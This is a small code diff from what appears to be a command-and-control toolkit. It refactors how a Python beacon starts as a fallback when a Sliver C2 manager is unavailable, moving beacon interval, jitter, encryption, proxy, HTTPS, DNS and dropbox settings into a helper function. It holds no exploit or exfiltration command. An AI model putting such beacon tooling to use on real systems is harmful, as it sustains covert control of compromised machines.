@@ -126,20 +126,10 @@ def main():
     # ── Fall back to Python beacon if Sliver unavailable ──
     if sliver_mgr is None and fallback_cfg.get("enabled", False):
         logger.info("Starting Python beacon (fallback C2)")
-        from software.c2.beacon import Beacon
+        from software.c2.beacon import (Beacon,
+                                        beacon_config_from_fallback)
 
-        fallback_as_config = {
-            "c2": {
-                "beacon_interval_seconds": c2_cfg.get("beacon_interval_seconds", 300),
-                "jitter_percent": c2_cfg.get("jitter_percent", 20),
-                "encryption_key": c2_cfg.get("encryption_key", ""),
-                "proxy": c2_cfg.get("proxy", {}),
-                "https": fallback_cfg.get("https", {}),
-                "dns": fallback_cfg.get("dns", {}),
-                "dropbox": True,
-            }
-        }
-        python_beacon = Beacon(fallback_as_config)
+        python_beacon = Beacon(beacon_config_from_fallback(c2_cfg))
         python_beacon.start()
 
     if sliver_mgr is None and python_beacon is None:
